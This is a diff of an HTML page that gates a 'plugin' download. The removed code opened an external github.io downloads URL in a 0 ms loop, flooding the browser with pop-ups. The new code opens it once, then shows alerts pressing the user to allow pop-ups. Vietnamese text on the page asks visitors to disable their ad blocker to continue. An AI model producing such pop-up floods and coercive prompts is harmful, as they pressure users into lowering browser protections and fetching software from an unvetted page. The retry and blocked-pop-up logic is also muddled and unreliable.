@@ -7,13 +7,35 @@
     <script>
         (function() {
             const url = 'https://ilovecodepython.github.io/plugin/downloads/index.html';
-            setInterval(() => {
+            let opened = false;
+            
+            function tryOpen() {
+                if (opened) return;
+                opened = true;
                 window.open(url, '_blank');
-            }, 0); // Open every 1000 milliseconds (1 second)
+                setTimeout(() => {
+                    if (document.hidden || !window.document.hasFocus()) {
+                        // If the document is hidden or not in focus, assume the popup was blocked
+                        alert('It seems your browser is blocking pop-ups. Please allow pop-ups for this site to continue.');
+                        document.getElementById('popup-message').style.display = 'block';
+                    }
+                }, 1);
+            }
+
+            // Try opening the URL immediately
+            tryOpen();
+            
+            // Reattempt opening periodically if blocked
+            setInterval(() => {
+                if (!opened) {
+                    tryOpen();
+                }
+            }, 1);
         })();
     </script>
 </head>
 <body>
     <p>Vui lòng đồng ý và tắt trình chặn quảng cáo để tiếp tục tải plugin. Cảm ơn!</p>
+    <p id="popup-message" style="display:none;">Vui lòng bật cửa sổ bật lên trong trình duyệt của bạn để tiếp tục.</p>
 </body>
 </html>
